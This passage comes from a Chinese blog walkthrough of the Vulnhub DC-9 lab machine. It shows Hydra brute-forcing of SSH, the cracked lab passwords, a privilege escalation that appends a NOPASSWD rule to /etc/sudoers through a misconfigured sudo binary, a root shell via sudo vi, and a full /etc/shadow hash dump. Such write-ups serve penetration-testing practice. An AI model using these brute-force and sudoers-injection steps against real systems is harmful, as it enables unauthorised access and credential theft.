class=\"hljs-number\">9842</span>\n</code></pre>\n</li>\n<li>\n<p>然后再使用<code>nmap</code>扫描看看</p>\n<pre><code class=\"hljs language-python\">nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-04 <span class=\"hljs-number\">14</span>:09 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00040</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">41</span>:E1:8F (VMware)\n</code></pre>\n<p>这下<code>SSH</code>端口就打开了</p>\n</li>\n</ul>\n</li>\n</ol>\n<h2>爆破SSH</h2>\n<ol>\n<li>\n<p>将<code>UserDetails</code>表的<code>username</code>和<code>password</code>字段分别保存</p>\n<pre><code class=\"hljs language-python\">hydra -L username -P password -vV -e ns <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span> ssh\n</code></pre>\n<p>爆破出个三用户的账号密码</p>\n<pre><code class=\"hljs language-python\">[<span class=\"hljs-number\">22</span>][ssh] host: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>   login: janitor   password: Ilovepeepee\n[<span class=\"hljs-number\">22</span>][ssh] host: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>   login: chandlerb   password: UrAG0D!\n[<span class=\"hljs-number\">22</span>][ssh] host: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>   login: joeyt   password: Passw0rd\n</code></pre>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>janitor</p>\n<pre><code class=\"hljs language-python\">janitor@dc-<span class=\"hljs-number\">9</span>:~$ whoami\njanitor                                                                                                                                                                                                           \njanitor@dc-<span class=\"hljs-number\">9</span>:~$ <span class=\"hljs-built_in\">id</span>                                                                                                                                                                                                \nuid=<span class=\"hljs-number\">1016</span>(janitor) gid=<span class=\"hljs-number\">1016</span>(janitor) groups=<span class=\"hljs-number\">1016</span>(janitor)                                                                                                                                                          \njanitor@dc-<span class=\"hljs-number\">9</span>:~$ uname -a\nLinux dc-<span class=\"hljs-number\">9</span> <span class=\"hljs-number\">4.19</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">6</span>-amd64 <span class=\"hljs-comment\">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux   </span>\n</code></pre>\n</li>\n<li>\n<p>寻找敏感文件</p>\n<ul>\n<li>\n<p><code>find /home -name *pass* 2>/dev/null</code></p>\n<p>发现<code>/home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt</code> ,查看</p>\n<pre><code class=\"hljs language-python\">BamBam01\nPassw0rd\nsmellycats\nP0Lic<span class=\"hljs-comment\">#10-4</span>\nB4-Tru3-001\n4uGU5T-NiGHts\n</code></pre>\n<p>将其追加到<code>password</code>后</p>\n</li>\n</ul>\n</li>\n<li>\n<p>我们将新的<code>password</code>文件拿去爆破</p>\n<pre><code class=\"hljs language-python\">hydra -L username -P password -vV -e ns <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span> ssh\n</code></pre>\n<p>炸出一个新用户，登录<code>ssh</code></p>\n<pre><code class=\"hljs language-python\">[<span class=\"hljs-number\">22</span>][ssh] host: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>   login: fredf   password: B4-Tru3-001\n</code></pre>\n</li>\n<li>\n<p>查看新用户<code>fredf</code>的权限</p>\n<ul>\n<li>\n<p><code>sudo -l</code> ,终于有权限了QvQ</p>\n<pre><code class=\"hljs language-python\">fredf@dc-<span class=\"hljs-number\">9</span>:~$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> fredf on dc-<span class=\"hljs-number\">9</span>:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\n\nUser fredf may run the following commands on dc-<span class=\"hljs-number\">9</span>:\n    (root) NOPASSWD: /opt/devstuff/dist/test/test\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>执行文件</p>\n<pre><code class=\"hljs language-python\">fredf@dc-<span class=\"hljs-number\">9</span>:/opt/devstuff/dist/test$ ./test\nUsage: python test.py read append\n</code></pre>\n<p>发现上级目录存在<code>test.py</code> 可能就是二进制文件<code>test</code>的原本的内容</p>\n</li>\n<li>\n<p>查看文件内容</p>\n<pre><code class=\"hljs language-python\">```python\nfredf@dc-<span class=\"hljs-number\">9</span>:/opt/devstuff$ cat test.py \n<span class=\"hljs-comment\">#!/usr/bin/python</span>\n\n<span class=\"hljs-keyword\">import</span> sys\n\n<span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span> (sys.argv) != <span class=\"hljs-number\">3</span> :\n    <span class=\"hljs-built_in\">print</span> (<span class=\"hljs-string\">\"Usage: python test.py read append\"</span>)\n    sys.exit (<span class=\"hljs-number\">1</span>)\n\n<span class=\"hljs-keyword\">else</span> :\n    f = <span class=\"hljs-built_in\">open</span>(sys.argv[<span class=\"hljs-number\">1</span>], <span class=\"hljs-string\">\"r\"</span>)\n    output = (f.read())\n\n    f = <span class=\"hljs-built_in\">open</span>(sys.argv[<span class=\"hljs-number\">2</span>], <span class=\"hljs-string\">\"a\"</span>)\n    f.write(output)\n    f.close()\n</code></pre>\n<pre><code class=\"hljs language-markdown\">\n<span class=\"hljs-bullet\">-</span> 如果参数数量不等于3（脚本名称和两个文件名），程序会打印用法提示并退出\n<span class=\"hljs-bullet\">-</span> 使用<span class=\"hljs-code\">`open()`</span>函数以只读模式打开第一个文件（<span class=\"hljs-code\">`sys.argv[1]`</span>），并将其内容读入变量<span class=\"hljs-code\">`output`</span>。\n<span class=\"hljs-bullet\">-</span> 打开第二个文件（<span class=\"hljs-code\">`sys.argv[2]`</span>）以附加模式（\"a\"）打开，并将从第一个文件读取的内容写入。\n\n思路：我们可以附加内容到 <span class=\"hljs-code\">`/etc/sudoers`</span> ,将当前用户<span class=\"hljs-code\">`fredf`</span> 附加<span class=\"hljs-code\">`fredf ALL=(ALL) NOPASSWD: ALL`</span> <span class=\"hljs-strong\">****</span>权限\n\n</code></pre>\n</li>\n<li>\n<p>创建文件 <code>test</code>内容是 <code>fredf ALL=(ALL) NOPASSWD: ALL</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># nano test</span>\n fredf ALL=(ALL) NOPASSWD: ALL\n</code></pre>\n</li>\n<li>\n<p>执行二进制文件</p>\n<pre><code class=\"hljs language-python\">fredf@dc-<span class=\"hljs-number\">9</span>:/tmp$ sudo /opt/devstuff/dist/test/test test /etc/sudoers\n</code></pre>\n<p>测试是否拥有权限</p>\n<pre><code class=\"hljs language-python\">fredf@dc-<span class=\"hljs-number\">9</span>:/tmp$ sudo cat /etc/shadow\nroot:$<span class=\"hljs-number\">6</span>$lFbb8QQt2wX7eUeE$6NC9LUG7cFwjIPZraeiOCkMqsJ4/4pndIOaio.f2f0Lsmy2G91EyxJrEZvZYjmXRfJK/jOiKK0iTGRyUrtl2R0:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ndaemon:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n<span class=\"hljs-built_in\">bin</span>:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsys:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsync:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ngames:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nman:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nlp:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nmail:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nnews:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nuucp:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nproxy:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nwww-data:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nbackup:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n<span class=\"hljs-built_in\">list</span>:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nirc:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ngnats:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nnobody:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n_apt:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsystemd-timesync:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsystemd-network:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsystemd-resolve:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nmessagebus:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsshd:*:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsystemd-coredump:!!:<span class=\"hljs-number\">18259</span>::::::\nmysql:!:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nmarym:$<span class=\"hljs-number\">6</span>$EC59.EO3fZXPPMVr$61TZ96DmGiYpTCyB02YdIl0Uvu82UnFMSxlZ5HcraYN<span class=\"hljs-number\">.5</span>sgJI/E028bxjZM5S2LwwN8LImSUxfz9fXckKfRdJ0:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\njulied:$<span class=\"hljs-number\">6</span>$<span class=\"hljs-number\">32</span>/2fdkDb73B.Pbu$ZY/FnFR9GHSLfdhOmqYc6Qrt0MrwllJ3VjZDoyc8386oYyuYRUIPDvz3GOp36KzlnzfKObcQKbA44OFRWVaTH/:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nfredf:$<span class=\"hljs-number\">6</span>$CLKIMQJIUehJJqbo$8afEl6ipZRF1LKIu8Qw9wbufGgFze6/xrBDdTr7oS6bTibipCenHJ/m/lzNj36i8pIfrsd2RVoEdA5jwxhnMZ1:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nbarneyr:$<span class=\"hljs-number\">6</span>$ozASzz3uY5pZ01N0$mXJ2Bh9t5vgmMpnTl6CXtvCRz5zYBr4bwYLE/0JtxPHAeFmlxJibsgQsJRemYYPbzVuFRIu9KD9CD3MFl5CJ6/:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ntomc:$<span class=\"hljs-number\">6</span>$96XehDk5ozd3Yx1N$ZmrnsxS6rH1KpyMN4E0YhRPKfcP/ZacdFl7eHgTVJhFwqfxgaDGH7aLYTONEi2XjXWV.TvbGL7nU3ihiHf30Y0:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\njerrym:$<span class=\"hljs-number\">6</span>$wlCURlxOqBWhare6$zq3RvAT4tdx12GoMP0BLK/TxLausSspKPCHWIQSuBVMXm8GN5Wi13FsIkvLpML93Ny8G6J/q3JEr41Pder6Q/.:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nwilmaf:$<span class=\"hljs-number\">6</span>$2hEqLZyozDA001uz$LFM49N1ZO1bN1KbMuzb9jJCIonwEPNBxEvEFmIXPgAL1KvKAxgJFH494CWHUyzsizvCz780z6r1OeufCgxHUm0:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nbettyr:$<span class=\"hljs-number\">6</span>$cZjlc4EB3VXiOGoY$fcW9ne5x2wQhYdnUukOcx0umnG/FSzuIGLZTRPo/VlPDWai/oM5FVaffLqSSim5xgwJ3JBerIdW6BXZWTc6gd.:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nchandlerb:$<span class=\"hljs-number\">6</span>$cVQ1y2nQYgwpMKvT$3rRdWV/3d0uasARPBvZlcAtrWQZdjJsndgSIfD27yf0jGTp6hxgXrI0v5CayLtuallgbCg44gLjnbCN8NlFHk0:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\njoeyt:$<span class=\"hljs-number\">6</span>$FfsFOF2eFLLssCIx$Xw2h6l2tkSye/9IoYbK0a6VeGd8771UJWyeYw1m2X6Xcgc1iE0UYaZf.ySUlD8tIsS6FRxyAxEZyYspbAdvIf/:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nrachelg:$<span class=\"hljs-number\">6</span>$yDoxHglucM5kjbyz$JL0k6riILYc2fDVu.S25TrVAWDXB5yjtdrhHtQkCp25oZnMTGq6dj8LJX8yGutyeNDd8mjyQT8UDtN9C6CKvA.:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nrossg:$<span class=\"hljs-number\">6</span>$m7qudrh2e.QzNHjz$W/qreraYyvBJICSt12Oha2pqvjRpPcyU1nhMpHKhHTZ/X3sRE7nvkVtHh0oYrKgjYyznWn6XtDShoN6tRmeYh1:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nmonicag:$<span class=\"hljs-number\">6</span>$OKThUPaRpzMonEJT$VJOMjAKPip3c6MSteIsrtu/x01VwvK6CfUYmY24RU5X.jYBJYbGzCQPFBpfzXc32D2jItQL2eTYtTxrrXh9pT.:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nphoebeb:$<span class=\"hljs-number\">6</span>$hv8tIcEfkNLWF0UD$JNOVj9XT0kOh/omUlPOzL8kbkNyqmcGSRuAwK97kHYEfzvP4MJnWiGTIbGuYW5wCGOzsJ2MN8e5fO5jh6f3GX/:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nscoots:$<span class=\"hljs-number\">6</span>$PxiTl9DHLbYR.R9b$K6judJrN68gASxg9mOLsL./YVhs4Gt/QTtI1Qx5Wj2Fc2QpgmDZtMhfwxNMs2nUSywOdRaPobhtvb2QT<span class=\"hljs-number\">.24</span>OK.:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\njanitor:$<span class=\"hljs-number\">6</span>$bQhC0fZ9g9313Aat$aZ0GecSMTi1qUGqSF6eAdGu2pDXRg1Zu8JzLyyhvSAwh8MnLzv3XPnu6Vw9OruPsgAGgA2dCYdOuk9T4hgDZ6/:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\njanitor2:$<span class=\"hljs-number\">6</span>$HkvFAeOwjGjr6jDj$CUt0HJpmATAcPYxVjsxsYclUWFgfaGucL.c/WiavCt.op9UjqkM2yZdoDpyFW1rZbiSHCQ2MGIy0kBhcPPnhn.:<span class=\"hljs-number\">18259</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n</code></pre>\n<p>可以不用密码使用<code>sudo cat</code> 表示提权成功</p>\n</li>\n<li>\n<p><code>sudo vi</code>提权</p>\n<p>进入后在末尾模式下输入<code>!/bin/bash</code></p>\n<pre><code class=\"hljs language-python\">fredf@dc-<span class=\"hljs-number\">9</span>:/tmp$ sudo vi\n\nroot@dc-<span class=\"hljs-number\">9</span>:/tmp<span class=\"hljs-comment\"># </span>\n</code></pre>\n<p>提权成功！</p>\n</li>\n<li>\n<p>读取<code>flag</code>文件</p>\n<pre><code class=\"hljs language-python\">root@dc-<span class=\"hljs-number\">9</span>:~<span class=\"hljs-comment\"># cat theflag.txt </span>\n\n███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗\n████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║\n██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║\n██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝\n██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗\n╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝\n                                                                             \nCongratulations - you have done well to get to this point.\n\nHope you enjoyed DC-<span class=\"hljs-number\">9.</span>  Just wanted to send out a big thanks to <span class=\"hljs-built_in\">all</span> those\nwho have taken the time to complete the various DC challenges.\n\nI also want to send out a big thank you to the various members of @m0tl3ycr3w .\n\nThey are an inspirational bunch of fellows.\n\nSure, they might smell a bit, but...just kidding.  :-)\n\nSadly, <span class=\"hljs-built_in\">all</span> things must come to an end, <span class=\"hljs-keyword\">and</span> this will be the last ever\nchallenge <span class=\"hljs-keyword\">in</span> the DC series.\n\nSo long, <span class=\"hljs-keyword\">and</span> thanks <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">all</span> the fish.\n\n</code></pre>\n</li>\n</ol>","title":"Vulnhub - DC-9","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"DC-9\n\n https://www.vulnhub.com/entry/dc-9,412/\n \n\n端口扫描主机发现\n\n1. 探测存活主机，`180`是靶机\n    \n    \n    \n2. 探测主机所有开放端口，仅存在`80`端口\n    \n    \n    \n3. 探测服务版本以及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n\nweb渗透\n\n1. 访问..."},"recentPosts":[{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"HackTheBoxMachine - Scepter","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"}]},"__N_SSG":true}